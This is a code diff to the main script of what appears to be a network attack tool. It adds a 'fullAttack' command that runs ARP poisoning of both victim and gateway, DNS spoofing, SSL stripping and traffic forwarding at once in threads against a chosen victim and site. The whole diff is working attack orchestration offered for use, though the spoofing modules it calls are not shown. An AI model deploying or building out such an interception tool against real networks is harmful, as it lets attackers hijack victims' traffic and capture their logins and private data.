@@ -6,6 +6,7 @@ from arpPoisoning import ARPSpoofer
 from dnsSpoofing import DNSSpoofer
 from sslStripping import SSLStripper
 from forwarder import Forwarder
+import threading
 
 def main():
     if not is_root():
@@ -46,6 +47,14 @@ def main():
     forward_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
     forward_parser.add_argument('--siteToSpoof', type=str, help='The website to spoof')
 
+    # Full attack
+    full_attack_parser = subparsers.add_parser('fullAttack', help='Perform a full attack')
+    full_attack_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
+    full_attack_parser.add_argument('--macVictim', type=str, help='The MAC address of the victim')
+    full_attack_parser.add_argument('--ipGateway', type=str, help='The IP address of the gateway')
+    full_attack_parser.add_argument('--siteToSpoof', type=str, help='The website to spoof')
+
+
     # -- Parse arguments --
     args = parser.parse_args()
 
@@ -80,7 +89,33 @@ def main():
             sys.exit("Usage: python main.py forward --ipVictim <ip> --siteToSpoof <url>")
         forwarder = Forwarder(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)
         forwarder.forward()
+    elif args.command == 'fullAttack':
+        if args.macVictim is None and args.ipVictim is not None:
+            args.macVictim = get_mac_address_from_ip(args.ipVictim)
+        if args.ipVictim is None or args.ipGateway is None or args.siteToSpoof is None:
+            sys.exit("Usage: python main.py fullAttack --ipVictim <ip> --macVictim <mac> --ipGateway <ip> --siteToSpoof <url>")
+        arp_spoofer_victim = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipVictim, args.ipGateway)
+        arp_spoofer_gateway = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipGateway, args.ipVictim)
+        dns_spoofer = DNSSpoofer(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)
+        ssl_stripper = SSLStripper(args.interface, args.ipVictim, args.ipAttacker, args.siteToSpoof)
+        forwarder = Forwarder(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)
+        arp_spoofer_victim_thread = threading.Thread(target=arp_spoofer_victim.spoof)
+        arp_spoofer_gateway_thread = threading.Thread(target=arp_spoofer_gateway.spoof)
+        dns_spoofer_thread = threading.Thread(target=dns_spoofer.spoof)
+        ssl_stripper_thread = threading.Thread(target=ssl_stripper.strip)
+        forwarder_thread = threading.Thread(target=forwarder.forward)
+        arp_spoofer_victim_thread.start()
+        arp_spoofer_gateway_thread.start()
+        dns_spoofer_thread.start()
+        ssl_stripper_thread.start()
+        forwarder_thread.start()
         
+        forwarder_thread.join()
+        ssl_stripper_thread.join()
+        dns_spoofer_thread.join()
+        arp_spoofer_gateway_thread.join()
+        arp_spoofer_victim_thread.join()
+
     elif args.command == 'listInterfaces':
         list_active_interfaces()
 
